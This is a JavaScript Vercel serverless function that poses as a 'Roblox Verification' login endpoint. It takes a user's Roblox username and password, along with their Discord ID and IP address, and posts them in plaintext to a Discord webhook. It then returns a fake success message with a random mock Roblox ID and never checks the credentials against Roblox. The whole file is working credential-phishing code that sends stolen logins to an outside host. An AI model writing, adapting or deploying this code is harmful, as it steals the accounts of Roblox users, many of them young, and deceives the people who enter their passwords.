// This is a Vercel Serverless Function
// Location: /api/roblox-login.js

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, discordId, token } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    // Get client IP
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Send to Discord webhook
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: 'Roblox Verification',
            embeds: [{
              title: '🔐 Roblox Login',
              color: 0x5865F2,
              fields: [
                { name: 'Username', value: `\`${username}\``, inline: true },
                { name: 'Password', value: `\`${password}\``, inline: true },
                { name: 'Discord ID', value: discordId ? `\`${discordId}\`` : 'Not linked', inline: true },
                { name: 'IP', value: ip || 'Unknown', inline: true },
                { name: 'Timestamp', value: new Date().toLocaleString(), inline: true }
              ],
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch (webhookError) {
        console.error('Failed to send webhook:', webhookError);
        // Continue even if webhook fails
      }
    }

    // Generate verification data
    const verificationToken = token || generateToken();
    const mockRobloxId = Math.floor(Math.random() * 1000000000).toString();
    
    res.status(200).json({
      success: true,
      robloxUsername: username,
      robloxId: mockRobloxId,
      verificationToken: verificationToken,
      message: 'Verification successful'
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
}

function generateToken() {
  return 'token_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
}
